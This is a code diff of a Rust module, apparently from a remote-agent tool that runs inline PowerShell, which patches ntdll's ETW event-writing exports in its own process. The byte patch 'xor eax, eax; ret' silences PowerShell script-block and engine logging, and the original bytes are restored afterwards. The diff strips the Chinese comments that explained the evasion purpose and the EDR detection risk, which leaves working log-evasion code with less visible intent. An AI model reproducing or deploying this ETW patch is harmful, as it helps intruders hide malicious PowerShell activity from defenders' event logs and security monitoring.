@@ -1,20 +1,6 @@
-//! ETW 痕迹抑制（瞬态 patch）。
 //!
-//! inline PowerShell 在宿主进程内执行时，PowerShell 引擎会把 ScriptBlock /
-//! Module / 引擎生命周期事件通过 `Microsoft-Windows-PowerShell` ETW provider
-//! 写入事件日志（Event Log 4104/4103/400/403 等）。这些事件最终经
-//! `ntdll!EtwEventWrite` 系列导出落地。
 //!
-//! 本模块在宿主进程（agent）内瞬态 patch ntdll 的 ETW 导出：
-//!   1. stub 执行前 `suppress()` —— 所有 Etw* 调用直接返回成功（不落日志）
-//!   2. 执行完（含错误路径）`Drop` 自动 `restore()` 原始字节
 //!
-//! 安全与检测面（重要）：
-//! - 只 patch **自己进程**的 ntdll（无跨进程 OpenProcess/WriteProcessMemory），
-//!   但改写系统 DLL 代码段本身是 EDR 行为检测的高危信号（与 AMSI patch 同级）。
-//! - 因此默认**关闭**，由操作员显式开启（`etwSuppress: true`），且仅在确认
-//!   目标环境后使用；开启后请勿在未隔离的 Defender 环境做行为验证。
-//! - patch 范围限于执行窗口（毫秒级），执行后完整恢复。
 
 #![allow(non_snake_case)]
 
@@ -31,11 +17,8 @@ extern "system" {
 #[cfg(target_os = "windows")]
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
-/// `xor eax, eax; ret` —— Etw* 函数直接返回 STATUS_SUCCESS。
 const ETW_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];
 
-/// ntdll 中与事件写入相关的导出（PowerShell 5.1 及 .NET CLR 的 EventSource
-/// 主要走 EtwEventWrite / EtwEventWriteEx；其余为覆盖变体）。
 const ETW_EXPORTS: &[&[u8]] = &[
     b"EtwEventWrite\0",
     b"EtwEventWriteEx\0",
@@ -47,21 +30,17 @@ const ETW_EXPORTS: &[&[u8]] = &[
     b"EtwWriteTransfer\0",
 ];
 
-/// 已保存的原始字节（地址 → 原字节 + 原保护属性）。
 struct SavedPatch {
     addr: *mut u8,
     original: [u8; 3],
     old_protect: u32,
 }
 
-/// 瞬态 ETW 抑制器：`suppress()` 打补丁，Drop 时自动恢复。
 pub struct EtwSuppressor {
     saved: Vec<SavedPatch>,
 }
 
 impl EtwSuppressor {
-    /// patch 当前进程 ntdll 的 ETW 导出。失败（如导出缺失）不致命——
-    /// 已成功的项照常恢复。
     pub fn suppress() -> Option<Self> {
         #[cfg(target_os = "windows")]
         {
@@ -109,7 +88,6 @@ impl EtwSuppressor {
         }
     }
 
-    /// 恢复原始字节与保护属性。失败静默（agent 自身不使用 ETW）。
     pub fn restore(&mut self) {
         #[cfg(target_os = "windows")]
         unsafe {
@@ -147,9 +125,6 @@ impl Drop for EtwSuppressor {
 mod tests {
     use super::*;
 
-    /// 验证 patch 后 EtwEventWrite 返回 0（STATUS_SUCCESS）且 restore 后恢复。
-    /// 注意：改写 ntdll 代码段会触发 Defender 行为检测，
-    /// 必须仅在隔离环境运行（`cargo test -- --ignored`）。
     #[test]
     #[ignore = "rewrites ntdll code — isolated environment only"]
     fn suppress_and_restore_roundtrip() {
@@ -164,7 +139,6 @@ mod tests {
 
         unsafe {
             let mut suppressor = EtwSuppressor::suppress().expect("suppress failed");
-            // patch 后调用应直接返回 0
             let hr = EtwEventWrite(
                 std::ptr::null_mut(),
                 std::ptr::null_mut(),
@@ -174,7 +148,6 @@ mod tests {
             assert_eq!(hr, 0, "EtwEventWrite should be suppressed (hr={hr})");
 
             suppressor.restore();
-            // restore 后调用走真实实现（参数无效 → 非 0）
             let hr2 = EtwEventWrite(
                 std::ptr::null_mut(),
                 std::ptr::null_mut(),
